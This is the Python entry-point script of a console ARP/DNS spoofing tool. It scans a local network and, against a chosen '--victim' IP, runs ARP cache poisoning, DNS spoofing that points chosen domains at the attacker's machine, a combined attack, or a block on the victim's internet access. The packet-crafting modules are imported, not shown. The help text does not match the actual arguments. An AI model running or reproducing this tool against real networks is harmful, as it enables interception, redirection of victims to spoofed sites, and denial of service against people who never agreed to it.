#!/usr/bin/env python3

"""
Main module
-----------------

This module serves as the entry point for the ARP Spoofing tool.
It initializes the GUI application and starts the main event loop.
It sets up the main window and runs the application.
"""

import signal
import sys
import time
import argparse
import colorama

from core.logger import Logger
from core.network_tools import NetworkTools
from core.builders.arp_builder import ArpBuilder
from core.strategies.dns_spoof import DnsSpoofStrategy
from core.attack_manager import AttackManager
from core.strategies.block_internet import BlockInternetStrategy

# Global variables
logger = Logger()
nt = NetworkTools()

def sig_handler(sig, frame) -> None:
    """
    Signal handler to gracefully exit the application on SIGINT (Ctrl+C).

    Args:
        sig (int): The signal number.
        frame (frame): The current stack frame.

    Returns:
        None
    """
    print(colorama.Fore.GREEN + 
    "\n\n[!] Exiting ARP Spoofing tool...\n" 
    + colorama.Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

def help_panel():
    """
    Displays the help panel for the ARP Spoofing tool.
    """
    print(colorama.Fore.CYAN + r"""
                  .__                   __          
       ____  ____ |  |   ____   _______/  |_  ____  
     _/ ___\/ __ \|  | _/ __ \ /  ___/\   __\/ __ \ 
     \  \__\  ___/|  |_\  ___/ \___ \  |  | \  ___/ 
      \___  >___  >____/\___  >____  > |__|  \___  >
          \/    \/          \/     \/            \/ 
    -------------------------------------------------

    Usage: python main.py [options]

    Options:
        -h, --help          Show this help message and exit
        -t, --target <IP>   Target IP address for ARP spoofing
        -d, --dns <domains> Comma-separated list of domains for DNS spoofing
        -c, --combo         Perform both ARP and DNS spoofing attacks
        -b, --block         Block internet access for the target IP
        -s, --scan          Scan the local network for active hosts

    Examples:
    """ + colorama.Style.RESET_ALL)

def build_arp_attack(target_ip: str) -> ArpBuilder:
    """
    Function to build ARP attack for a given target IP.

    Args:
        target_ip (str): The IP address of the target host.

    Returns:
        arp_builder: An instance of the ARP builder with the target and gateway IPs and MAC addresses set.
    """
    gateway_ip = nt.get_gateway_ip()
    target_mac = nt.get_mac(target_ip)
    gateway_mac = nt.get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        logger.log("[-] Could not retrieve MAC addresses.")
        return None
    
    return (ArpBuilder()
            .set_target_ip(target_ip)
            .set_gateway_ip(gateway_ip)
            .set_target_mac(target_mac)
            .set_gateway_mac(gateway_mac)
            .build())

def build_dns_attack(domains: dict) -> DnsSpoofStrategy:
    """
    Function to build DNS spoofing attack for a list of domains.

    Args:
        domains (dict): A dictionary mapping domain names to IP addresses.

    Returns:
        DnsSpoofingStrategy: An instance of the DNS spoofing strategy with the provided domain mappings.
    """
    local_ip = nt.get_local_ip()
    domains_map = {}

    for domain in domains.split(','):
        domain = domain.strip()
        if domain and not domain.endswith('.'):
            domain += '.'
        domains_map[domain] = local_ip
    return DnsSpoofStrategy(domains_map, logger)

def handle_arp(target_ip: str) -> None:
    """
    Function to handle ARP spoofing attack.

    Args:
        target_ip (str): The IP address of the target host.

    Returns:
        None
    """
    print(colorama.Fore.YELLOW + 
    f"\n[*] Starting ARP spoofing attack on {target_ip}..." 
    + colorama.Style.RESET_ALL)
    time.sleep(2)

    arp = build_arp_attack(target_ip)
    if not arp:
        return
    
    manager = AttackManager()
    manager.set_strategy(arp)
    manager.start()
    input("[*] Press Enter to stop ARP spoofing...")
    manager.stop()

def handle_dns(target_ip: str, domains: dict) -> None:
    """
    Function to handle DNS spoofing attack.

    Args:
        target_ip (str): The IP address of the target host.
        domains (dict): A dictionary mapping domain names to IP addresses.

    Returns:
        None
    """
    dns = build_dns_attack(domains)
    manager = AttackManager()
    manager.set_strategy(dns)
    manager.start()
    input("[*] Press Enter to stop DNS spoofing...")
    manager.stop()

def handle_combo(target_ip: str, domains: dict) -> None:
    """
    Function to handle a combination of ARP and DNS spoofing attacks.

    Args:
        target_ip (str): The IP address of the target host.
        domains (dict): A dictionary mapping domain names to IP addresses.

    Returns:
        None
    """
    arp = build_arp_attack(target_ip)
    dns = build_dns_attack(domains)
    manager = AttackManager()

    if arp and dns:
        manager.set_strategy(arp)
        manager.start()
        time.sleep(2)
        manager.set_strategy(dns)
        manager.start()

    input("[*] Press Enter to stop the attacks...")
    manager.stop()

def handle_block_internet(target_ip: str) -> None:
    """
    Function to block internet access for a target IP address.

    Args:
        target_ip (str): The IP address of the target host.
    
    Returns:
        None
    """
    gateway_ip = nt.get_gateway_ip()
    target_mac = nt.get_mac(target_ip)

    if not target_mac:
        logger.log("[-] Could not retrieve target MAC address.")
        return

    block_internet = BlockInternetStrategy(target_ip, gateway_ip, target_mac, logger)
    manager = AttackManager()
    manager.set_strategy(block_internet)
    manager.start()
    
    input("[*] Press Enter to stop blocking internet access...")
    manager.stop()

def handle_scan() -> None:
    """
    Function to scan the local network for active hosts.
    This function retrieves the local IP address, scans the network for active hosts,
    and logs the results.

    Returns:
        None
    """
    local_ip = nt.get_local_ip()

    print(colorama.Fore.YELLOW + 
    f"\n[*] Scanning network for active hosts in {local_ip}..." 
    + colorama.Style.RESET_ALL)
    time.sleep(2)

    cidr = ".".join(local_ip.split('.')[:3]) + '.1/24'
    hosts = nt.scan_network(cidr)
    logger.log(f"[+] Active hosts in {cidr}:")

    for ip, mac in hosts:
        logger.log(f"IP: {ip}, MAC: {mac}")

def main():
    """
    Main function to parse command-line arguments and execute the appropriate actions.
    It initializes the colorama library for colored output, sets up the argument parser,
    and handles the different options for ARP spoofing, DNS spoofing, blocking internet access,
    and network scanning.

    Returns:
        None
    """
    colorama.init(autoreset=True)

    parser = argparse.ArgumentParser(description="ARP/DNS Spoofing Tool - Console Version", add_help=False)
    parser.add_argument("-h", "--help", action="store_true", help="Show this help message and exit")
    subparsers = parser.add_subparsers(dest="command")

    subparsers.add_parser("scan", help="Scan the local network")

    arp_parser = subparsers.add_parser("arp", help="Perform ARP spoofing")
    arp_parser.add_argument("--victim", required=True)

    dns_parser = subparsers.add_parser("dns", help="Perform DNS spoofing")
    dns_parser.add_argument("--victim", required=True)
    dns_parser.add_argument("--domains", required=True)

    combo_parser = subparsers.add_parser("combo", help="Perform ARP + DNS spoofing")
    combo_parser.add_argument("--victim", required=True)
    combo_parser.add_argument("--domains", required=True)

    block_parser = subparsers.add_parser("block", help="Block internet for a host")
    block_parser.add_argument("--victim", required=True)

    args = parser.parse_args()

    if args.help or not args.command:
        help_panel()
        sys.exit(1)

    command_map = {
        "scan": lambda: handle_scan(),
        "arp": lambda: handle_arp(args.victim),
        "dns": lambda: handle_dns(args.victim, args.domains),
        "combo": lambda: handle_combo(args.victim, args.domains),
        "block": lambda: handle_block_internet(args.victim)
    }

    command_map[args.command]()


if __name__ == "__main__":
    main()